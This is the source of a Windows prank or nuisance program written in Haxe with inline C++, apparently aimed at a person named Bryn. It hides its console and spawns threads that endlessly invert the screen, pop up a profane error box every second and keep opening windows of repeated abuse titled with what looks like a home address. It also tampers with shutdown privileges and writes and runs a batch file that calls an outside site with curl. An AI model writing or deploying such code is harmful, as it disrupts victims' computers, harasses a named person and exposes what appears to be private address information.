import haxe.Timer;
import sys.io.File;
import sys.FileSystem;

@:cppFileCode('#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <dwmapi.h>
#include <thread>
#include <strsafe.h>
#include <shellapi.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#ifndef SE_PRIVILEGE_DISABLED
#define SE_PRIVILEGE_DISABLED 0x00000000
#endif

#pragma comment(lib, "Dwmapi")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")
using namespace std;

bool brynIsAnIdiot = false;')

class Main {
    @:functionCode('
        HDC hdc = GetDC(NULL);
        
        int horizontalRes = GetDeviceCaps(hdc, HORZRES);
        int verticalRes = GetDeviceCaps(hdc, VERTRES);
        
        int logicalWidth = GetDeviceCaps(hdc, DESKTOPHORZRES);
        int logicalHeight = GetDeviceCaps(hdc, DESKTOPVERTRES);
        
        int dpiX = GetDeviceCaps(hdc, LOGPIXELSX);
        int dpiY = GetDeviceCaps(hdc, LOGPIXELSY);
        
        int x = static_cast<double>(logicalWidth) * dpiX / 96;
        int y = static_cast<double>(logicalHeight) * dpiY / 96;
        BitBlt(hdc, rand() % 10, rand() % 10, x, y, hdc, rand() % 12, rand() % 12, SRCINVERT);
    ')
    static function gdigoescrazy() {
        return 0;
    }
    @:functionCode('
        if (!brynIsAnIdiot) {
            CreateThread(NULL, 0, [](LPVOID)->DWORD {
                MessageBox(NULL, "GET FUCKED!", "Error", MB_ICONERROR | MB_OK | MB_APPLMODAL);
                return 0;
            }, NULL, 0, NULL);
        }
    ')
    static function msgbox() {
        return 0;
    }
    @:functionCode('
        NOTIFYICONDATA notifyIconData;
        ZeroMemory(&notifyIconData, sizeof(notifyIconData));
        notifyIconData.cbSize = sizeof(notifyIconData);
        notifyIconData.uFlags = NIF_INFO;
        notifyIconData.hWnd = NULL;
        notifyIconData.uID = 0;
        notifyIconData.hIcon = LoadIcon(NULL, IDI_INFORMATION);
        notifyIconData.uTimeout = 5000;
        lstrcpy(notifyIconData.szInfoTitle, TEXT(title.c_str()));
        lstrcpy(notifyIconData.szInfo, TEXT(text.c_str()));
        BOOL result = Shell_NotifyIcon(NIM_ADD, &notifyIconData);
        if (!result) {
            return 1;
        }
        return 0;
    ')
    static function throwToast(title:String, text:String) {
        return 0;
    }
    @:functionCode('
        if (!brynIsAnIdiot) {
            DWORD threadID;
            HANDLE hThread = CreateThread(NULL, 0, [](LPVOID lpParameter) -> DWORD {
                // Initialize window
                HWND window;
                WNDCLASSEXW windowClass;
                ZeroMemory(&windowClass, sizeof(WNDCLASSEXW));
            
                windowClass.cbSize = sizeof(WNDCLASSEXW);
                windowClass.style = CS_HREDRAW | CS_VREDRAW;
                windowClass.lpfnWndProc = DefWindowProcW;
                windowClass.hInstance = GetModuleHandleW(NULL);
                windowClass.hCursor = LoadCursorW(NULL, MAKEINTRESOURCEW(IDC_ARROW));
                windowClass.hbrBackground = CreateSolidBrush(RGB(0, 0, 0)); // Black background color
                windowClass.lpszClassName = L"WindowClass";
                RegisterClassExW(&windowClass);
            
                // Create window
                window = CreateWindowExW(NULL,
                    L"WindowClass",
                    L"62 Delapre Drive, Ellenbrook WA 6069, Australia",
                    WS_OVERLAPPEDWINDOW,
                    CW_USEDEFAULT, CW_USEDEFAULT,
                    640, 480, // Window dimensions
                    NULL, NULL,
                    GetModuleHandleW(NULL),
                    NULL);
                
                // Create text control
                HWND textControl = CreateWindowExW(NULL,
                    L"STATIC",
                    L"FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN FUCK YOU BRYN ",
                    WS_CHILD | WS_VISIBLE | SS_CENTER, // Center the text control
                    200, 200, 240, 80,
                    window,
                    NULL,
                    GetModuleHandleW(NULL),
                    NULL);
                
                // Set font and text color
                HFONT font = CreateFontW(
                    48,                       // Height of font
                    0,                        // Width of font
                    0,                        // Angle of escapement
                    0,                        // Orientation angle
                    FW_NORMAL,                // Font weight
                    FALSE,                    // Italic attribute option
                    FALSE,                    // Underlined attribute option
                    FALSE,                    // Strikeout attribute option
                    ANSI_CHARSET,             // Character set identifier
                    OUT_DEFAULT_PRECIS,       // Output precision
                    CLIP_DEFAULT_PRECIS,      // Clipping precision
                    DEFAULT_QUALITY,          // Output quality
                    DEFAULT_PITCH | FF_SWISS, // Font pitch and family
                    L"Arial"                  // Font typeface name
                );
                
                HDC hdc = GetDC(textControl);
                SetBkMode(hdc, TRANSPARENT);  // Set background mode to transparent
                SetTextColor(hdc, RGB(255, 255, 255)); // Set text color to white
                SelectObject(hdc, font);        // Select custom font
                
                // Show window and start message loop
                ShowWindow(window, SW_SHOW);
                MSG msg = { 0 };
                while (GetMessage(&msg, NULL, 0, 0) > 0)
                {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
            
                return 0;
            }, nullptr, 0, &threadID);
        }
    ')
    static function makeDaBrynnyWindow() {}
    static function main() {
        untyped __cpp__('HWND window;
        AllocConsole();
        window = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(window,0);');
        untyped __cpp__('HANDLE hToken;
        TOKEN_PRIVILEGES tkp;
    
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = 0; // Disable the privilege
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    
        // Set process shutdown parameters to block the shutdown
        SetProcessShutdownParameters(0x100, SHUTDOWN_NORETRY);');
        throwToast("FUCK YOU", "f");
        //making something so this can be considered an update -crys
        trace(Sys.environment()["TEMP"]);
        File.saveContent(Sys.environment()["TEMP"]+"/rr.bat", "curl ascii.live/can-you-hear-me");
        sys.thread.Thread.create(()->{
            Sys.command("start " + Sys.environment()["TEMP"]+"/rr.bat");
        });

        var timer = new Timer(1000);
        timer.run = () -> {
            msgbox();
        }
        var timer = new Timer(5000);
        timer.run = () -> {
            sys.thread.Thread.create(()->{
                makeDaBrynnyWindow();
            });
        }
        sys.thread.Thread.create(()->{
            while (true) {
                gdigoescrazy();
                //Sys.sleep(0.05);
                //trace("GET FUCKED");
            }
        });
    }
}